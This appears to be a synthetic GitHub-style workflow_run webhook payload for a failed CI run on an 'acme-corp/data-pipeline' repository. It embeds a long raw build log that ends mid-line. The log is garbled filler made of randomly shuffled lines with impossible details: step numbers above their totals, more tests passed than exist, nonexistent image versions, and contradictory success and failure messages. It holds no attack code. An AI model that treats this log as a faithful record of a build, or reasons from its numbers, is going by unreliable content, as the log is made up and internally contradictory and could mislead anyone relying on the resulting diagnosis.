{
  "action": "completed",
  "workflow_run": {
    "id": 501,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "166d6f7d0476e92619d322aaee6dd5287d1bd569",
    "status": "completed",
    "conclusion": "failure",
    "run_started_at": "2025-11-26T12:19:02.988417Z",
    "updated_at": "2025-11-26T12:23:26.949743Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "alice"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_production ===\nCache restored successfully (162MB)\nCompiling components/service.java...\nStep 15/16: Linting\nStep 12/18: Installing dependencies\nGET /api - 204 (4ms)\nBundling main.js\nAlready up to date.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:02] INFO: Cache refreshed\nLayer 1/15: ENV command\nPulling image: node:3.11\n[12:19:02] INFO: Request completed\n[12:19:02] WARN: Deprecated API usage\n[12:19:02] WARN: Deprecated API usage\n[12:19:02] DEBUG: Query executed in 4ms\nPulling image: node:latest\nOK\nPOST /api - 200 (175ms)\nCache hit for key-4032\n[12:19:02] DEBUG: Connection pool: 7 active\nnpm install: resolved 341 packages\n  PASS: unit/test_user_create.spec.js\nCompiling lib/handler.rs...\nCache miss for key-4124\nLoading...\nStep 8/21: Running migrations\nUsing Python 3.10\n\u2713 All checks passed\n[12:19:02] DEBUG: Memory usage: 1876MB\nException: RuntimeError\nGenerating source maps...\nyarn add: Done in 25.41s\nSwitched to branch 'hotfix/task-673'\nPOST /upload - 201 (356ms)\n[12:19:02] ERROR: Connection failed\nStep 18/23: Building\nChecking out master branch\nTime: 29.247s\nArtifact uploaded: build.tar.gz (41MB)\nEnvironment: production\nSuccess!\nnpm install: added 438 packages\n[12:19:02] ERROR: Connection failed\nException: ValueError\nVerifying...\nTest Suites: 15 passed, 16 total\nPulling image: python:18\nnpm notice: package.json updated\nSnapshots: 44 passed, 26 total\nAlready up to date.\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (11MB)\nPlatform: linux-x64\nCache invalidated: build\nProcessing...\nSnapshots: 38 passed, 4 total\nSnapshots: 41 passed, 36 total\n\u2713 Step 'install' succeeded\nWARNING: express has known vulnerabilities\nInstalling axios@2.16.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:02] INFO: Starting build process\n[12:19:02] INFO: Cache refreshed\nStep 19/15: Linting\n[12:19:02] DEBUG: Memory usage: 390MB\nArtifact downloaded: 35MB\nUsing Node.js 14.13.0\nEnvironment: test\n[12:19:02] INFO: Cache refreshed\nOptimizing 55 modules...\nCache saved successfully\nInstalling prettier@5.18.6\nImage pulled successfully\nInstalling webpack@1.7.4\nPulling image: alpine:3.11\nCreating production build...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 112\nInstalling lodash@1.12.0\nOK\nChecking out develop branch\n\u2713 Step 'checkout' succeeded\nBundling vendor.js\nArtifact uploaded: build.tar.gz (18MB)\nPulling image: node:latest\nWaiting...\nStep 17/25: Installing dependencies\nCompiling src/app.ts...\nDone.\nTransforming 378 files...\nFAILED: test_api_health\nWaiting...\nGET /api - 200 (2ms)\nUsing Python 3.12\nFetching submodules...\npip: Downloading react-2.7.tar.gz\n[12:19:02] DEBUG: Query executed in 30ms\nCache restored successfully (252MB)\nGET /status - 201 (25ms)\nWaiting...\nMinifying main.js\nVerifying...\nCache restored successfully (270MB)\nnpm install: added 474 packages\nGenerating source maps...\n[12:19:02] DEBUG: Loading configuration\nTest Suites: 8 passed, 43 total\n[12:19:02] INFO: Cache refreshed\nPOST /data - 200 (181ms)\nWARNING: express has known vulnerabilities\n\u2713 Step 'test' succeeded\nCache miss for key-5005\n[12:19:02] DEBUG: Initializing service\nVerifying...\nException: RuntimeError\nHEAD is now at f409174\nFetching submodules...\nTime: 78.164s\nInstalling eslint@3.4.6\nEnvironment: development\nReady.\n[12:19:03] INFO: Cache refreshed\nSuccess!\nPOST /data - 202 (394ms)\nArtifact uploaded: dist.zip (23MB)\nArtifact downloaded: 44MB\nPushing to registry...\nDone.\nSnapshots: 8 passed, 29 total\nAlready up to date.\nCache hit for key-2982\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\nTest Suites: 36 passed, 46 total\nConnecting to test.io:443...\nLoading...\nCompiling utils/app.ts...\nTLS handshake completed\npip: Collecting lodash\nCache restored successfully (500MB)\nCache hit for key-6784\nOK\nnpm install: resolved 1470 packages\npip: Collecting express\n[12:19:03] DEBUG: Query executed in 44ms\nUploading artifact 'dist' (26 files)\nCoverage: 96% statements, 81% branches\n[12:19:03] INFO: Starting build process\n[12:19:03] INFO: Starting build process\nUsing Node.js 18.3.5\nPushing to registry...\nRan 49 tests in 25s\nBuilding Docker image...\nCompiling utils/main.py...\nAlready up to date.\n[12:19:03] DEBUG: Loading configuration\npip: Collecting prettier\nStep 4/18: Deploying\nCompiling components/utils.go...\n[12:19:03] INFO: Starting build process\n[12:19:03] DEBUG: Initializing service\nTLS handshake completed\nArtifact uploaded: build.tar.gz (32MB)\nStep 16/15: Testing\nnpm notice: created a lockfile\nStep 10/17: Installing dependencies\nEnvironment: production\nConnecting to cloud.services:443...\nEnvironment: production\nGenerating source maps...\nMinifying app.js\nUsing Python 3.12\nInstalling react@2.13.8\nSwitched to branch 'hotfix/task-521'\nWARNING: lodash has known vulnerabilities\n\u2713 validate completed\nOptimizing 27 modules...\nPOST /api - 200 (206ms)\npip: Downloading prettier-2.12.tar.gz\nCache invalidated: dependencies\nHEAD is now at 8c99278\nUsing Node.js 14.12.3\n[12:19:03] DEBUG: Connection pool: 15 active\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (81MB)\n[12:19:03] DEBUG: Loading configuration\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\n[12:19:03] DEBUG: Initializing service\n\u2717 build failed with exit code 114\nFAILED: test_api_health\npip: Installing build dependencies...\nnpm install: added 328 packages\nStep 17/16: Linting\n\u2713 All checks passed\nCreating production build...\nStep 7/15: Linting\n[12:19:03] DEBUG: Initializing service\nCompiling components/handler.rs...\npip: Collecting eslint\nImage pulled successfully\nDone.\nAlready up to date.\n[12:19:03] INFO: Processing request\nStep 1/24: Deploying\nnpm install: resolved 1561 packages\n\u2713 Step 'test' succeeded\n[12:19:03] INFO: Processing request\nStep 6/24: Testing\n\u2713 All checks passed\nCoverage: 91% statements, 86% branches\npip install: Successfully installed axios-1.6\nCache restored successfully (363MB)\nStep 6/19: Running migrations\nGenerating source maps...\n  PASS: integration/test_cache_hit.spec.js\n[12:19:03] WARN: Deprecated API usage\nCache invalidated: build\nVerifying...\n  PASS: integration/test_user_create.spec.js\nFAILED: test_auth_login\n=== Step deploy_production completed ===\n=== Step: type_check ===\nnpm notice: package.json updated\n[12:19:03] DEBUG: Memory usage: 1544MB\nCache invalidated: node_modules\n[12:19:03] INFO: Request completed\nCache hit for key-6641\nUploading artifact 'dist' (3 files)\nCompiling components/index.js...\nStep 19/20: Installing dependencies\n  PASS: test_api_health (278ms)\nCache saved successfully\nCache hit for key-5577\nUploading artifact 'dist' (22 files)\nHEAD is now at a9cd408\nProcessing...\nTransforming 401 files...\n[12:19:03] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 15/18: Deploying\nReady.\nCoverage: 98% statements, 61% branches\n[12:19:03] INFO: Starting build process\nTests: 166 passed, 320 total\npip: Installing build dependencies...\nStep 18/16: Testing\nCreating production build...\n[12:19:03] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:03] WARN: Deprecated API usage\nWARNING: eslint has known vulnerabilities\nWARNING: jest has known vulnerabilities\n[12:19:03] WARN: Deprecated API usage\nEnvironment: staging\nnpm install: added 169 packages\nnpm install: resolved 1167 packages\n[12:19:03] DEBUG: Initializing service\nTest Suites: 14 passed, 31 total\n[12:19:03] DEBUG: Initializing service\nnpm install: resolved 495 packages\nEnvironment: staging\nTime: 15.450s\nnpm install: added 218 packages\n\u2717 build failed with exit code 21\n[12:19:03] INFO: Connecting to database\nCompleted.\nBundling runtime.js\nCreating production build...\nRan 165 tests in 1s\nnpm install: added 183 packages\nPulling image: alpine:18\nTest Suites: 39 passed, 12 total\n\u2713 All checks passed\nCompiling lib/utils.go...\nyarn add: Done in 14.97s\nOptimizing 54 modules...\nFinished.\nLoading...\nStep 2/16: Testing\nCreating production build...\nInstalling eslint@2.14.6\nGET /api - 204 (2ms)\nCache invalidated: node_modules\nTime: 114.225s\n[12:19:03] DEBUG: Loading configuration\nPlatform: win32-x64\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact downloaded: 22MB\nImage pulled successfully\nUploading artifact 'coverage' (28 files)\nReady.\nnpm notice: created a lockfile\nStep 12/16: Testing\nTransforming 743 files...\nTime: 93.552s\nTime: 14.476s\npip: Collecting axios\nWARNING: webpack has known vulnerabilities\nCache restored successfully (363MB)\nOptimizing 86 modules...\nyarn add: Done in 27.28s\nnpm install: resolved 1695 packages\n[12:19:03] INFO: Connecting to database\nPlatform: win32-x64\nCache miss for key-2514\n[12:19:03] DEBUG: Initializing service\nCreating production build...\n[12:19:03] INFO: Connecting to database\nLoading...\nCache invalidated: build\nBuilding Docker image...\nCompleted.\nCoverage: 75% statements, 81% branches\nChecking out main branch\nCache miss for key-8294\nTransforming 538 files...\n[12:19:03] ERROR: Connection failed\nnpm notice: package.json updated\nFinished.\n[12:19:03] ERROR: Connection failed\nTime: 109.763s\n\u2713 All checks passed\n[12:19:03] DEBUG: Memory usage: 1636MB\n\u2713 Task completed in 1708ms\nBundling runtime.css\nWaiting...\nImage pulled successfully\nCoverage: 80% statements, 80% branches\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nBundling runtime.css\n\u2713 All checks passed\nGenerating source maps...\nCompiling components/app.ts...\nUsing Python 3.10\nStep 7/24: Building\nHEAD is now at 768c1f7\nTransforming 840 files...\nTransforming 273 files...\n[12:19:03] INFO: Processing request\nLayer 8/13: ENV command\nGenerating source maps...\nPulling image: node:18\nWARNING: axios has known vulnerabilities\nImage pulled successfully\nSnapshots: 38 passed, 50 total\nStep 20/16: Running migrations\nWaiting...\n[12:19:03] WARN: Deprecated API usage\nOK\n\u2713 Step 'setup' succeeded\nCompleted.\nArtifact uploaded: build.tar.gz (14MB)\n[12:19:03] DEBUG: Query executed in 61ms\nCache restored successfully (138MB)\n[12:19:03] DEBUG: Query executed in 82ms\n\u2713 All checks passed\nStep 10/21: Building\nSwitched to branch 'bugfix/task-715'\n[12:19:03] INFO: Starting build process\nStep 16/18: Running migrations\nProcessing...\nTime: 55.453s\n[12:19:03] INFO: Starting build process\nFinished.\nCompiling src/index.js...\nCache hit for key-8403\nNODE_ENV=development\nArtifact downloaded: 1MB\nTest Suites: 5 passed, 45 total\n[12:19:03] DEBUG: Query executed in 49ms\nGenerating source maps...\npip: Installing build dependencies...\nVerifying...\nArtifact uploaded: dist.zip (31MB)\nStep 12/23: Installing dependencies\n\u2713 All checks passed\n[12:19:03] INFO: Processing request\n\u2713 All checks passed\nCompiling src/utils.go...\nStep 19/19: Running migrations\nConnecting to test.io:443...\nCache saved successfully\nCache saved successfully\nPulling image: alpine:3.11\nGET /api - 204 (24ms)\nProcessing...\nHEAD is now at bcbb400\npip: Collecting prettier\nnpm notice: created a lockfile\nSuccess!\nCompiling components/app.ts...\npip: Collecting express\n\u2713 Task completed in 2926ms\nInstalling express@1.20.4\nArtifact uploaded: dist.zip (61MB)\nPOST /api - 201 (359ms)\nTest Suites: 24 passed, 25 total\nGET /api - 200 (23ms)\nSuccess!\n[12:19:03] WARN: Deprecated API usage\nTime: 3.165s\nnpm notice: created a lockfile\nChecking out develop branch\nLoading...\nCache hit for key-5554\nVerifying...\nPulling image: python:latest\nCompiling utils/app.ts...\nReady.\nVerifying...\nStep 19/21: Installing dependencies\nOptimizing 10 modules...\nChecking out develop branch\nDone.\nInstalling axios@1.12.4\n[12:19:03] INFO: Request completed\nUsing Python 3.10\nGET /health - 200 (75ms)\nCreating production build...\npip: Installing build dependencies...\nNODE_ENV=test\nCompleted.\nLoading...\nFAILED: test_auth_login\nCache invalidated: node_modules\nDone.\nCompiling src/service.java...\nTest Suites: 45 passed, 29 total\nWARNING: jest has known vulnerabilities\nStep 19/18: Running migrations\nnpm notice: created a lockfile\nyarn add: Done in 14.24s\nCompiling lib/index.js...\nVerifying...\nStep 13/20: Installing dependencies\nChecking out develop branch\nOK\nCompiling components/service.java...\nRan 126 tests in 33s\nArtifact downloaded: 49MB\nNODE_ENV=test\n[12:19:03] DEBUG: Initializing service\npip install: Successfully installed prettier-2.13\nCache invalidated: dependencies\n[12:19:03] INFO: Cache refreshed\n=== Step type_check completed ===\n=== Step: build ===\nnpm notice: package.json updated\nnpm install: added 71 packages\nStep 18/19: Running migrations\n[12:19:03] INFO: Processing request\nTime: 41.419s\nTLS handshake completed\nMinifying app.js\nImage pulled successfully\npip install: Successfully installed axios-5.17\nLayer 1/14: RUN command\nWARNING: webpack has known vulnerabilities\nLayer 3/12: COPY command\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: jest has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSwitched to branch 'hotfix/task-797'\n\u2713 All checks passed\nCompiling lib/index.js...\nUsing Node.js 19.15.7\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip install: Successfully installed lodash-1.16\nTime: 114.786s\n[12:19:03] INFO: Processing request\n[12:19:03] WARN: Deprecated API usage\nnpm notice: package.json updated\nOK\n[12:19:03] DEBUG: Query executed in 54ms\nWARNING: prettier has known vulnerabilities\nException: ValueError\n\u2713 validate completed\npip: Collecting jest\nPlatform: win32-x64\nStep 2/15: Running migrations\nLoading...\nCache miss for key-9113\n\u2713 Task completed in 508ms\nConnection established\nnpm notice: package.json updated\nCompleted.\nAlready up to date.\n\u2713 Task completed in 955ms\nCache saved successfully\n\u2713 Task completed in 3484ms\nNODE_ENV=production\nTLS handshake completed\nStep 4/18: Installing dependencies\nStep 13/21: Testing\nPOST /api - 202 (94ms)\nCache invalidated: node_modules\nMinifying vendor.js\nTransforming 588 files...\nSwitched to branch 'bugfix/task-119'\nUsing Node.js 17.12.4\nFinished.\nUsing Node.js 18.4.9\nArtifact downloaded: 47MB\nUploading artifact 'dist' (24 files)\n[12:19:03] INFO: Cache refreshed\nOK\nRan 68 tests in 54s\n[12:19:03] DEBUG: Query executed in 68ms\nTransforming 509 files...\nLayer 3/8: COPY command\nStep 9/23: Deploying\nInstalling prettier@2.6.1\nAlready up to date.\n  PASS: e2e/test_api_health.spec.js\n\u2713 package completed\nTest Suites: 42 passed, 49 total\nBuilding Docker image...\nMinifying main.js\nMinifying main.js\nOptimizing 74 modules...\n[12:19:03] WARN: Deprecated API usage\n[12:19:03] DEBUG: Memory usage: 1864MB\nPushing to registry...\nSuccess!\nPlatform: win32-x64\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPlatform: linux-x64\nLayer 10/9: RUN command\nStep 6/18: Building\nConnecting to cloud.services:443...\nCompiling src/utils.go...\n  PASS: e2e/test_db_connect.spec.js\nSwitched to branch 'bugfix/task-111'\nProcessing...\n\u2713 Task completed in 4090ms\nWARNING: express has known vulnerabilities\n\u2713 All checks passed\n\u2713 Task completed in 2429ms\npip: Installing build dependencies...\nnpm install: added 296 packages\n[12:19:03] INFO: Cache refreshed\nStep 13/15: Linting\nPOST /upload - 200 (73ms)\nCache saved successfully\nUsing Node.js 18.16.7\nCompiling src/main.py...\nLayer 6/14: RUN command\nCompiling components/handler.rs...\nTime: 118.179s\nSuccess!\nCompiling src/main.py...\nnpm install: added 306 packages\nImage pulled successfully\nStep 18/25: Running migrations\nPushing to registry...\nnpm install: added 292 packages\nBuilding Docker image...\nGET /health - 204 (35ms)\n[12:19:03] INFO: Cache refreshed\nStep 10/17: Running migrations\n[12:19:03] INFO: Starting build process\nnpm notice: package.json updated\nStep 19/20: Installing dependencies\npip: Installing build dependencies...\n  PASS: test_db_connect (82ms)\nStep 7/23: Testing\nConnecting to example.com:443...\npip: Downloading express-3.1.tar.gz\nPOST /upload - 202 (158ms)\nnpm notice: created a lockfile\nWARNING: jest has known vulnerabilities\nCompiling src/main.py...\nMinifying app.js\n[12:19:03] WARN: Deprecated API usage\nBuilding Docker image...\nTests: 84 passed, 272 total\nStep 19/23: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\n[12:19:03] DEBUG: Loading configuration\nyarn add: Done in 23.38s\nImage pulled successfully\nProcessing...\nTime: 115.372s\nBundling runtime.js\n[12:19:03] INFO: Request completed\nyarn add: Done in 26.5s\nWARNING: prettier has known vulnerabilities\nWARNING: lodash has known vulnerabilities\nVerifying...\nTime: 21.218s\nCreating production build...\n[12:19:03] WARN: Deprecated API usage\n[12:19:03] DEBUG: Loading configuration\nSwitched to branch 'hotfix/task-409'\n  PASS: integration/test_auth_login.spec.js\nStep 4/19: Installing dependencies\nStep 13/16: Deploying\nCompiling src/index.js...\n[12:19:03] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTime: 92.109s\n\u2713 Step 'test' succeeded\n\u2713 All checks passed\nAlready up to date.\nDone.\n[12:19:03] INFO: Cache refreshed\nAlready up to date.\nUploading artifact 'dist' (32 files)\nArtifact uploaded: dist.zip (30MB)\nRan 90 tests in 9s\nFinished.\nCompiling utils/app.ts...\nCache miss for key-9940\n[12:19:03] DEBUG: Loading configuration\nRan 152 tests in 52s\n[12:19:03] INFO: Connecting to database\nFetching submodules...\nSuccess!\n[12:19:03] DEBUG: Memory usage: 1345MB\nUsing Node.js 20.0.6\nCompleted.\nnpm notice: package.json updated\nOK\nRan 190 tests in 44s\nCache saved successfully\nnpm notice: package.json updated\nChecking out master branch\nConnecting to cloud.services:443...\nUsing Node.js 18.10.4\nStep 8/18: Linting\nSuccess!\nnpm notice: created a lockfile\nOK\n[12:19:03] ERROR: Connection failed\nCache miss for key-4434\n[12:19:03] DEBUG: Loading configuration\n\u2717 build failed with exit code 99\nCompiling src/app.ts...\nCompiling src/index.js...\nStep 1/19: Testing\nWARNING: jest has known vulnerabilities\nLoading...\nCache invalidated: build\nSnapshots: 43 passed, 50 total\nStep 7/21: Running migrations\n  PASS: unit/test_db_connect.spec.js\n[12:19:03] INFO: Request completed\nPushing to registry...\nCompiling components/app.ts...\nEnvironment: development\n[12:19:03] INFO: Processing request\nUsing Node.js 19.14.2\nOptimizing 41 modules...\nCompiling src/app.ts...\n[12:19:03] DEBUG: Connection pool: 6 active\nTime: 38.340s\nGET /status - 201 (86ms)\nnpm notice: package.json updated\n\u2713 Task completed in 3382ms\n[12:19:03] INFO: Request completed\nCache miss for key-1566\nSuccess!\nInstalling axios@3.18.9\nCompleted.\n[12:19:03] DEBUG: Memory usage: 447MB\n\u2713 All checks passed\nStep 18/16: Building\n[12:19:03] INFO: Connecting to database\n=== Step build completed ===\n=== Step: lint ===\nPlatform: darwin-arm64\nCreating production build...\n[12:19:03] ERROR: Connection failed\n[12:19:03] INFO: Starting build process\nPlatform: linux-x64\nStep 15/18: Installing dependencies\nCache invalidated: dependencies\n\u2713 All checks passed\nGET /health - 201 (67ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nDone.\nWARNING: lodash has known vulnerabilities\nCompiling components/utils.go...\nTests: 302 passed, 162 total\nArtifact downloaded: 39MB\n\u2713 deploy completed\nOK\nInstalling express@3.16.6\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:03] DEBUG: Initializing service\nLoading...\nCompiling lib/handler.rs...\n[12:19:03] WARN: Deprecated API usage\nStep 19/23: Building\nHEAD is now at dc2d3ee\nPushing to registry...\nHEAD is now at fd0499f\nSnapshots: 3 passed, 48 total\nBundling main.css\nPlatform: win32-x64\nVerifying...\nCompiling lib/service.java...\n[12:19:03] DEBUG: Memory usage: 1058MB\nPlatform: win32-x64\nAlready up to date.\nArtifact uploaded: dist.zip (84MB)\nCoverage: 100% statements, 63% branches\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCreating production build...\nnpm notice: package.json updated\nPushing to registry...\nSwitched to branch 'bugfix/task-615'\nUsing Python 3.11\nNODE_ENV=production\nTransforming 215 files...\nCompleted.\nCoverage: 87% statements, 97% branches\n[12:19:03] DEBUG: Query executed in 51ms\nTLS handshake completed\nEnvironment: development\n[12:19:03] DEBUG: Memory usage: 1378MB\nWARNING: jest has known vulnerabilities\n\u2713 validate completed\nFetching submodules...\nnpm notice: created a lockfile\nProcessing...\n  PASS: integration/test_auth_login.spec.js\nCompiling src/index.js...\nSwitched to branch 'hotfix/task-688'\nPlatform: win32-x64\nPushing to registry...\n[12:19:03] INFO: Processing request\n\u2713 Task completed in 813ms\npip: Collecting lodash\nArtifact downloaded: 3MB\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nImage pulled successfully\nConnection established\nnpm notice: created a lockfile\nPlatform: linux-x64\nStep 9/17: Installing dependencies\nnpm notice: created a lockfile\nCache saved successfully\nWaiting...\nAlready up to date.\nCache restored successfully (198MB)\nCache restored successfully (14MB)\n[12:19:03] DEBUG: Connection pool: 9 active\nPOST /api - 202 (42ms)\nConnecting to example.com:443...\nStep 15/16: Running migrations\nCompiling src/app.ts...\nFinished.\nImage pulled successfully\nTests: 344 passed, 289 total\nInstalling webpack@2.4.4\n[12:19:03] WARN: Deprecated API usage\nTLS handshake completed\n[12:19:03] WARN: Deprecated API usage\nCache miss for key-8013\nSuccess!\npip: Collecting lodash\nStep 16/19: Installing dependencies\nProcessing...\nStep 15/19: Building\nGenerating source maps...\nCompiling components/app.ts...\n\u2713 All checks passed\nArtifact downloaded: 42MB\nStep 10/15: Installing dependencies\npip: Downloading prettier-5.17.tar.gz\n\u2713 validate completed\nStep 2/23: Running migrations\nCompiling src/index.js...\nSwitched to branch 'feature/task-429'\nRan 143 tests in 43s\n[12:19:03] DEBUG: Initializing service\n  PASS: test_auth_login (148ms)\n[12:19:03] INFO: Starting build process\nUploading artifact 'dist' (23 files)\nCompiling src/utils.go...\nStep 16/16: Linting\n[12:19:03] DEBUG: Connection pool: 8 active\nArtifact downloaded: 40MB\nCreating production build...\nTests: 241 passed, 317 total\nPlatform: win32-x64\n\u2717 build failed with exit code 45\nWARNING: jest has known vulnerabilities\nyarn add: Done in 11.65s\nHEAD is now at 4eaa8ce\n\u2713 Task completed in 958ms\nSnapshots: 2 passed, 13 total\nCompiling src/service.java...\n[12:19:03] DEBUG: Query executed in 29ms\n[12:19:03] INFO: Connecting to database\nUsing Node.js 16.18.8\nnpm notice: created a lockfile\n\u2713 validate completed\nAlready up to date.\nnpm notice: created a lockfile\npip: Downloading lodash-3.14.tar.gz\nNODE_ENV=test\nCache hit for key-5507\nStep 16/18: Linting\n[12:19:03] INFO: Processing request\nLoading...\nCache saved successfully\nRan 63 tests in 20s\nTime: 74.221s\nOK\n[12:19:03] WARN: Deprecated API usage\npip install: Successfully installed jest-2.2\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: eslint has known vulnerabilities\nChecking out main branch\nPushing to registry...\nArtifact uploaded: build.tar.gz (12MB)\nVerifying...\nGenerating source maps...\nStep 18/17: Linting\nCache invalidated: build\n[12:19:03] DEBUG: Memory usage: 897MB\n[12:19:03] INFO: Starting build process\nInstalling jest@5.9.5\nEnvironment: staging\n[12:19:03] DEBUG: Connection pool: 17 active\n[12:19:03] DEBUG: Initializing service\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 16/23: Linting\nArtifact uploaded: build.tar.gz (2MB)\n[12:19:03] INFO: Cache refreshed\nWARNING: eslint has known vulnerabilities\nInstalling react@1.16.3\nReady.\npip: Downloading express-4.20.tar.gz\nHEAD is now at 37e71ba\nPushing to registry...\nStep 19/21: Linting\nFinished.\nnpm notice: created a lockfile\nTime: 77.158s\nStep 3/20: Running migrations\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (33MB)\nTransforming 360 files...\n[12:19:03] DEBUG: Initializing service\nCache invalidated: build\n[12:19:03] INFO: Starting build process\n\u2713 build completed\nCache miss for key-5797\n[12:19:03] DEBUG: Loading configuration\nFAILED: test_user_create\nFetching submodules...\nHEAD is now at 381b5f5\n\u2713 All checks passed\nUsing Python 3.12\nStep 11/25: Deploying\nnpm install: added 464 packages\n[12:19:03] INFO: Processing request\nStep 12/22: Testing\nCache hit for key-4469\n  PASS: unit/test_user_create.spec.js\nVerifying...\n\u2717 build failed with exit code 103\nChecking out master branch\n[12:19:03] INFO: Starting build process\nPlatform: linux-x64\n\u2713 All checks passed\n\u2713 Step 'test' succeeded\n  PASS: test_user_create (44ms)\n\u2713 All checks passed\nWARNING: axios has known vulnerabilities\npip: Collecting react\npip: Collecting express\nPulling image: node:18\nUploading artifact 'coverage' (9 files)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (17MB)\nLoading...\nVerifying...\nImage pulled successfully\nFetching submodules...\nPlatform: darwin-arm64\n[12:19:03] INFO: Connecting to database\n[12:19:03] INFO: Starting build process\nTest Suites: 16 passed, 8 total\nReady.\nnpm notice: created a lockfile\nArtifact downloaded: 32MB\nReady.\n=== Step lint completed ===\n=== Step: setup_node ===\nUploading artifact 'build' (20 files)\nUploading artifact 'build' (49 files)\nCache saved successfully\nCache invalidated: build\nProcessing...\npip: Downloading jest-1.10.tar.gz\nUsing Python 3.10\nConnection established\nCompiling lib/utils.go...\nPulling image: python:3.11\nHEAD is now at 02cfcc2\n[12:19:03] DEBUG: Initializing service\nnpm notice: package.json updated\n[12:19:03] ERROR: Connection failed\nUploading artifact 'build' (16 files)\npip: Collecting axios\n\u2713 lint completed\nBundling vendor.css\nFAILED: test_api_health\nVerifying...\nPulling image: alpine:18\nCache hit for key-2130\nCache saved successfully\nCache miss for key-7193\nFAILED: test_db_connect\nPOST /upload - 201 (54ms)\nnpm install: added 87 packages\nCache restored successfully (354MB)\nBundling main.js\nSwitched to branch 'feature/task-142'\nnpm notice: package.json updated\n[12:19:03] WARN: Deprecated API usage\nPlatform: darwin-arm64\nUploading artifact 'build' (12 files)\n[12:19:03] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:03] WARN: Deprecated API usage\nVerifying...\n[12:19:03] WARN: Deprecated API usage\nyarn add: Done in 1.45s\nUploading artifact 'dist' (47 files)\npip: Collecting express\nSnapshots: 42 passed, 39 total\nGenerating source maps...\nnpm install: added 487 packages\nEnvironment: test\nGET /status - 201 (100ms)\nTransforming 129 files...\n[12:19:03] DEBUG: Connection pool: 5 active\nBuilding Docker image...\nnpm notice: package.json updated\nSuccess!\nCompiling lib/handler.rs...\nCompiling src/utils.go...\nPushing to registry...\npip: Collecting prettier\nyarn add: Done in 7.44s\nCreating production build...\n  PASS: test_user_create (220ms)\npip: Installing build dependencies...\nFetching submodules...\nGenerating source maps...\n\u2713 Task completed in 619ms\nBuilding Docker image...\nFinished.\n\u2713 Task completed in 4941ms\nWaiting...\nPushing to registry...\n[12:19:03] WARN: Deprecated API usage\nPushing to registry...\nCreating production build...\nGenerating source maps...\nUsing Python 3.12\nWARNING: webpack has known vulnerabilities\nStep 16/24: Linting\nPlatform: linux-x64\n[12:19:03] INFO: Request completed\nGenerating source maps...\nStep 12/18: Installing dependencies\nBuilding Docker image...\nCompiling components/app.ts...\nSuccess!\npip: Downloading eslint-3.16.tar.gz\nPulling image: python:latest\nSuccess!\n[12:19:03] INFO: Request completed\nnpm install: resolved 323 packages\nOptimizing 95 modules...\nInstalling react@3.2.7\nCompiling utils/main.py...\n  PASS: e2e/test_cache_hit.spec.js\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nConnection established\nLayer 7/8: COPY command\nProcessing...\nStep 5/23: Deploying\n[12:19:03] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: e2e/test_db_connect.spec.js\nBundling styles.css\nProcessing...\nWARNING: express has known vulnerabilities\n  PASS: e2e/test_user_create.spec.js\npip install: Successfully installed express-5.13\nCache hit for key-7981\nException: RuntimeError\nEnvironment: staging\nLoading...\nUsing Node.js 15.9.9\nyarn add: Done in 5.42s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGET /health - 201 (41ms)\nRan 157 tests in 21s\nCompiling lib/handler.rs...\nStep 6/23: Running migrations\nyarn add: Done in 22.84s\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (3MB)\n[12:19:03] WARN: Deprecated API usage\n[12:19:03] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (29MB)\n[12:19:03] DEBUG: Connection pool: 2 active\nWARNING: webpack has known vulnerabilities\nFinished.\nLayer 3/15: ENV command\npip: Downloading lodash-2.14.tar.gz\nStep 7/19: Deploying\nAlready up to date.\n[12:19:03] DEBUG: Connection pool: 2 active\n[12:19:03] DEBUG: Query executed in 4ms\nArtifact downloaded: 6MB\nCache restored successfully (402MB)\nWARNING: react has known vulnerabilities\nFAILED: test_api_health\nTests: 497 passed, 299 total\nFinished.\n\u2713 lint completed\nCompiling utils/handler.rs...\n[12:19:03] INFO: Connecting to database\nWARNING: eslint has known vulnerabilities\nSwitched to branch 'feature/task-965'\nGenerating source maps...\n[12:19:03] WARN: Deprecated API usage\nCreating production build...\nInstalling lodash@1.18.7\nStep 9/20: Installing dependencies\n\u2713 Step 'build' succeeded\n\u2713 All checks passed\nArtifact uploaded: build.tar.gz (28MB)\npip install: Successfully installed react-3.7\nCache restored successfully (266MB)\nHEAD is now at efba6b8\n\u2713 Task completed in 1968ms\n  PASS: 